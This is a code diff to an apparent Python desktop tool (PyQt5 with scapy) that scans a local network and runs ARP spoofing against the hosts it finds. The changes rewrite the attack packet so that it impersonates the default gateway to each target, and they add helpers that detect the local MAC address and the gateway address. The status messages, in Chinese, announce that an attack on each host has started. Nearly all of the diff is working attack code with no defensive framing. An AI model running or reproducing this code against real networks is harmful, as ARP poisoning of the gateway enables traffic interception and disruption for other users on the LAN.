@@ -1,7 +1,9 @@
 import socket
 import time
 from PyQt5.QtCore import pyqtSignal,QThread
-from scapy.all import srp, Ether, ARP,sendp
+from scapy.all import srp, Ether, ARP,sendp,getmacbyip
+import uuid
+import os,re
 
 class Scan(QThread):
     _signal = pyqtSignal(str)
@@ -40,13 +42,18 @@ class Arpattack(QThread):
         while self.working:
             for i in self.iplist:
                 try:
-                    p1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=i[0]) / ARP(pdst=i[1],psrc=IP)
+                    # p1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=i[0]) / ARP(pdst=i[1],psrc=IP)
+                    p1 = Ether(dst=i[0],src=MAC) / ARP(op=1,hwsrc=MAC,psrc=GWIP,hwdst=i[0],pdst=i[1])
                     self._signal.emit("开始攻击主机: {}".format(i[1]))
                     sendp(p1)
-                except:
+                except Exception as e:
+                    print(e)
                     self._signal.emit("攻击失败")
             time.sleep(0.1)
 
+def get_host_mac():
+    mac = uuid.UUID(int=uuid.getnode()).hex[-12:].upper()
+    return ":".join([mac[e:e + 2] for e in range(0, 11, 2)])
 
 def get_host_ip_net():
     # 获取本网段 ip地址
@@ -61,4 +68,12 @@ def get_host_ip_net():
     ipnet = ".".join(listip)+".1/24"
     return ip ,ipnet
 
+def gwtway():
+    rtable = os.popen('route print').read()
+    gwip = re.findall(r'0\.0\.0\.0\s+0\.0\.0\.0\s+(\S+)\s',rtable)[0]
+    gwmac = getmacbyip(gwip)
+    return gwip,gwmac
+
 IP, IPNET = get_host_ip_net()
+MAC = get_host_mac()
+GWIP,GWMAC = gwtway()
